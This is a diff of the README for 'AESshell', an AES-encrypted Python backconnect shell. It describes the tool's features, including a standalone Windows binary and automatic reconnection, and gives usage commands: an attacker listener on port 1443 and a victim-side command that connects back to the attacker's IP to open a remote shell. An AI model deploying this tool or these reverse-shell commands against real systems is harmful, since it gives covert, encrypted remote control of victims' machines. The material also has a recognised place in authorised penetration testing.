@@ -1,15 +1,26 @@
+   _____  ___________ _________      .__           .__  .__   
+  /  _  \ \_   _____//   _____/ _____|  |__   ____ |  | |  |  
+ /  /_\  \ |    __)_ \_____  \ /  ___/  |  \_/ __ \|  | |  |  
+/    |    \|        \/        \\___ \|   Y  \  ___/|  |_|  |__
+\____|__  /_______  /_______  /____  >___|  /\___  >____/____/
+        \/        \/        \/     \/     \/     \/           
+
 Bright side
 -----------
-Python2.7 AES CBC Mode HMAC-SHA256 Backconnect Shell
-- running on windows and unix (mac untested)
-- compiles with pyinstaller under windows, so no python installation needed
-- change crypto key in both files
- -> python2 -c 'import aes;aye = aes.Crypticle.generate_key_string();print "Set new key: ", aye'
+- python2.7 AES CBC Mode HMAC-SHA256 Backconnect Shell
+- running on windows and unix (mac untested, works most probably)
+- compiles with pyinstaller, so no python installation needed
+- tries 10 times to connect back, quits afterwards
+- windows binary provided
 
 Usage
 -----
+Change crypto key in both files:
+$ python2 -c 'import aes;aye = aes.Crypticle.generate_key_string();print "Set new key: ", aye'
+Open up the files and replace the key.
+
 Attacker:
-shell > ./listen.py 0.0.0.0 1443
+$ ./listen.py 0.0.0.0 1443
 
 Victim:
 C:\bc.exe 192.168.1.1 1443
@@ -23,9 +34,13 @@ aes.py - crypto import
 
 WARNING
 -------
-Warning! This will *NOT* spawn a fully featured shell on windows or unix.
-While unix will be added soon, it seems to be quite complicated getting it done
-under Windows without digging deeper.
+Warning! AESshell will *NOT* spawn a fully featured shell on windows!
+While with unix the old filedescriptor and fork trick works, it seems to be 
+more complicated getting it done under windows using python.
 
-As this tool pipes commands to the command interpreter of the remote system
-DO NOT try to execute cmd.exe or bash or vi. Your pseudo shell will hang.
+That said, DO NOT try to execute cmd.exe or alike if you backconnect from a
+windows system - your pseudo shell will hang.
+
+Author
+------
+Marco Lux <ping@curesec.com>
